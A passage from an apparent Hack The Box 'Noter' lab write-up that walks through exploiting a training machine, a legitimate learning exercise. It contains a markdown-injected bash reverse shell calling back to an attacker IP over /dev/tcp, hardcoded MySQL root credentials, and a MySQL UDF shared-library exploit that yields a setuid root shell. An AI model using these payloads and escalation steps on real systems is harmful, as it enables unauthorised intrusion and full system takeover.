+220 (vsFTPd 3.0.3)
+Name (10.129.171.223:caue): ftp_admin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||19749|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        1003         4096 May 02 23:05 .
+drwxr-xr-x    2 0        1003         4096 May 02 23:05 ..
+-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
+-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
+226 Directory send OK.
+ftp&gt;</code></pre>
+</doc-codeblock></div>
+<p>We see that one was created in November and the other in December. Lets keep it organised and create a fodler for each one:
+<figure class="content-center">
+    <img src="images/image08.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="code-analyses">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#code-analyses">#</doc-anchor-trigger>
+        <span>Code analyses</span>
+    </h3>
+</doc-anchor-target>
+<p>The difference is that in the November backup the file <code v-pre>app.py</code> had MySQL credentials:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">app.py</div>
+<pre class="language-python"><code v-pre class="language-python">...[snip]...
+
+# Config MySQL
+app.config['MYSQL_HOST'] = 'localhost'
+app.config['MYSQL_USER'] = 'root'
+app.config['MYSQL_PASSWORD'] = 'Nildogg36'
+app.config['MYSQL_DB'] = 'app'
+app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
+
+...[snip]...</code></pre>
+</doc-codeblock></div>
+<p>We can also see in the source-code that the application is using <code v-pre>md-to-pdf</code> module and looking at the implementation of &quot;export_note_remote&quot; there is a remote command execution vulnerability:
+<figure class="content-center">
+    <img src="images/image09.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="foothold">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h3>
+</doc-anchor-target>
+<p>Searching on internet we find a CVE for the <code v-pre>md-to-pdf</code> module:</p>
+<ul>
+<li><a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880</a></li>
+</ul>
+<p>Logged in as user <code v-pre>blue</code> we can go to the Dashboard and we see the &quot;Export Notes&quot; function:
+<figure class="content-center">
+    <img src="images/image10.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>After trying a couple times we see that the server only accepts a markdown file. Lets prepare one to send us a reverse shell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/noter/www$ cat rce.md     
+a'; bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1; echo 'a</code></pre>
+</doc-codeblock></div>
+<p>Now we start a netcat listener on port 4444.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/noter$ nc -lnvp 4444</code></pre>
+</doc-codeblock></div>
+<p>We go to <a href="http://10.129.172.62:5000/export_note">http://10.129.172.62:5000/export_note</a>, add our IP to the URL box, start a python web server to host the <code v-pre>rce.md</code> file and click on &quot;Export&quot;:
+<figure class="content-center">
+    <img src="images/image11.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We receive a connection back on the netcat listener:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/noter$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.172.62] 43380
+bash: cannot set terminal process group (1247): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@noter:~/app/web$</code></pre>
+</doc-codeblock></div>
+<p>We can go to <code v-pre>/home/svc</code> and get the user flag.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">svc@noter:~$ ls -la
+total 44
+drwxr-xr-x 8 svc  svc  4096 May  2 23:05 .
+drwxr-xr-x 3 root root 4096 May  2 23:05 ..
+drwxrwxr-x 3 root root 4096 May  2 23:05 app
+lrwxrwxrwx 1 root root    9 Dec 27 09:04 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 svc  svc  3771 Dec 23 14:13 .bashrc
+drwx------ 3 svc  svc  4096 May  2 23:05 .cache
+drwx------ 5 svc  svc  4096 May  2 23:05 .config
+drwx------ 5 svc  svc  4096 May  2 23:05 .local
+lrwxrwxrwx 1 root root    9 Dec 27 09:04 .mysql_history -&gt; /dev/null
+drwxrwxr-x 4 svc  svc  4096 May  2 23:05 .npm
+drwxrwxr-x 5 svc  svc  4096 May  8 12:44 .pm2
+-rw-r--r-- 1 svc  svc   807 Dec 23 14:13 .profile
+-rw-r----- 1 svc  svc    33 May  8 12:45 user.txt</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="privilege-escalation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
+        <span>Privilege Escalation</span>
+    </h2>
+</doc-anchor-target>
+<p>There is something interesting in the user home directory:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">svc@noter:~$ ls -la /home/svc/
+
+...[snip]...
+
+lrwxrwxrwx 1 root root    9 Dec 27 09:04 .mysql_history -&gt; /dev/null
+
+...[snip]...</code></pre>
+</doc-codeblock></div>
+<p>As we can see the MySQL history file is owned by root and we got the credentials to login as root user from the application source-code previously:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">...[snip]...
+
+app.config['MYSQL_USER'] = 'root'
+app.config['MYSQL_PASSWORD'] = 'Nildogg36'
+
+...[snip]...</code></pre>
+</doc-codeblock></div>
+<p>We can confirm that mysql is running as root reading the database configuration:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">svc@noter:~$ cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep -v &quot;#&quot; | grep &quot;user&quot;
+user                    = root</code></pre>
+</doc-codeblock></div>
+<p>Great! We can exploit this vulnerability loading a malicious shared library into MySQL.</p>
+<doc-anchor-target id="mysql-user-defined-functions">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#mysql-user-defined-functions">#</doc-anchor-trigger>
+        <span>MySQL User Defined Functions</span>
+    </h3>
+</doc-anchor-target>
+<p>Download the exploit from <a href="https://www.exploit-db.com/exploits/1518">here</a> and upload it to the target machine.
+Compile it:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">svc@noter:/tmp$ gcc -g -c raptor_udf2.c
+svc@noter:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</code></pre>
+</doc-codeblock></div>
+<p>Lets login to MySQL:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">svc@noter:~$ mysql -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 5421
+Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]&gt;
+MariaDB [(none)]&gt; use mysql;</code></pre>
+</doc-codeblock></div>
+<p>We need to load the shared library into the mysql plugins directory. Lets see where is it:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">MariaDB [mysql]&gt; show variables like 'plugin_dir';
++---------------+---------------------------------------------+
+| Variable_name | Value                                       |
++---------------+---------------------------------------------+
+| plugin_dir    | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
++---------------+---------------------------------------------+</code></pre>
+</doc-codeblock></div>
+<p>Perfect, now we can follow the exploit directions to create a function that will load the library and execute code as the user running the mysql server, in our case, the <code v-pre>root</code> user:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">MariaDB [mysql]&gt; use mysql;
+MariaDB [mysql]&gt; create table foo(line blob);
+MariaDB [mysql]&gt; insert into foo values(load_file('/tmp/raptor_udf2.so'));
+MariaDB [mysql]&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+MariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so';
+MariaDB [mysql]&gt; select * from mysql.func;
+MariaDB [mysql]&gt; select do_system('id &gt; /tmp/out; chown svc.svc /tmp/out');
+MariaDB [mysql]&gt; \! sh
+
+$ cat /tmp/out
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+</doc-codeblock></div>
+<p>Here we proved that we have code execution as <code v-pre>root</code>, so lets make a copy of bash and give <code v-pre>+s</code> privileges so we can get a root shell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">MariaDB [mysql]&gt; use mysql;
+MariaDB [mysql]&gt; create table foo(line blob);
+MariaDB [mysql]&gt; insert into foo values(load_file('/tmp/raptor_udf2.so'));
+MariaDB [mysql]&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+MariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so';
+MariaDB [mysql]&gt; select * from mysql.func;
+MariaDB [mysql]&gt; select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
+
++-----------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash') |
++-----------------------------------------------------------------+
+|                                                               0 |
++-----------------------------------------------------------------+
+MariaDB [mysql]&gt; exit
+
+svc@noter:/tmp$ ./rootbash -p
+rootbash-5.0# id
+uid=1001(svc) gid=1001(svc) euid=0(root) egid=0(root) groups=0(root),1001(svc)</code></pre>
+</doc-codeblock></div>
+<p>We are root!</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results />
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/late/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Late</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overflow/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Overflow</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2022. Caue All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script>window.__DOCS__ = { "title": "Noter", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+</body>
+</html>
